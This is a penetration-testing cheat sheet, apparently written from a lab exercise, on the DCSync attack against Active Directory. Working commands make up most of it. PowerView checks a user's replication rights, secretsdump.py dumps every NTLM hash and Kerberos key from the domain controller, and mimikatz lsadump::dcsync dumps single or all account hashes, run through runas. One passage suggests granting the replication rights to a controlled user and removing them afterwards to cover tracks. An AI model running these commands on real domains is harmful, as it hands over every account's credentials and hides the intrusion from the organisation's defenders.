### Content
- [Enumerate DCSync attack using PowerView](#enumerate-dcsync-attack-using-powerview)
- [DCSync attack with secretsdump](#dcsync-attack-with-secretsdump)
- [DCSync attack with mimikatz](#dcsync-attack-with-mimikatz)
---
- DCSync is a technique used to request the passwords of any user from a domain controller through the replication protocol (DRSUAPI) `Directory Replication Service Remote Protocol`.
- It is used by Domain Controllers to replicate domain data including the Active Directory password database. 
- This requires `DS-Replication-Get-Changes-All` and `DS-Replication-Get-Changes` permissions on the domain object
- The attack is beneficial to retrieve the current NTLM password hash for any domain user and the hashes corresponding to their previous passwords.
<img src="/assets/adnunn_right_dcsync.webp" width="65%" height="70%" style="display: block; margin:auto;">
---
#### Enumerate DCSync attack using PowerView
``` PowerShell
# The user that we are in control of
PS C:\> $sid = Convert-NameToSid adunn
PS C:\> $sid
S-1-5-21-3842939050-3880317879-2865463114-1164

# Check adunn's Replication Rights [DS-Replication-Get-Changes, DS-Replication-Get-Changes-All]
# "<Domain_Object_Distinguished_Name>" = "DC=INLANEFREIGHT,DC=LOCAL"
PS C:\> Get-ObjectAcl "<Domain_Object_Distinguished_Name>" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl

......[SNIP]......
AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-1164
ObjectAceType         : DS-Replication-Get-Changes-All
......[SNIP]......
```

If we had certain rights over the user `adunn` (such as [WriteDacl](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl)), we could also add this privilege to a user under our control, execute the DCSync attack, and then remove the privileges to attempt to cover our tracks.

---
#### DCSync attack with secretsdump

``` bash
$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@<DC_IP>
$ ls inlanefreight_hashes*

inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
```

- `-just-dc` flag tells the tool to extract NTLM hashes and Kerberos keys from the NTDS file.
- `-just-dc-ntlm` flag if we only want NTLM hashes.
- `-just-dc-user INLANEFREIGHT/adunn` to only extract data for a specific user.
- `-pwd-last-set` to see when each account's password was last changed
- `-user-status` flag to check and see if a user is disabled.

`secretsdump.py` will decrypt any passwords stored using reversible encryption while dumping the NTDS file either as a Domain Admin or using an attack such as DCSync.

---
#### DCSync attack with mimikatz

Using Mimikatz, we must target a specific user.
Here we will target the built-in administrator account.

Mimikatz must be ran in the context of the user who has DCSync privileges. We can utilize `runas.exe` to accomplish this:
``` CMD
C:\Windows\system32>runas /netonly /user:INLANEFREIGHT\adunn powershell
```

From the newly spawned powershell session, we can perform the attack:

``` PowerShell
PS C:\> .\mimikatz.exe
mimikatz # privilege::debug
# Dump one user hash
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
# Dump all hashes to a CSV
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /all /csv
```
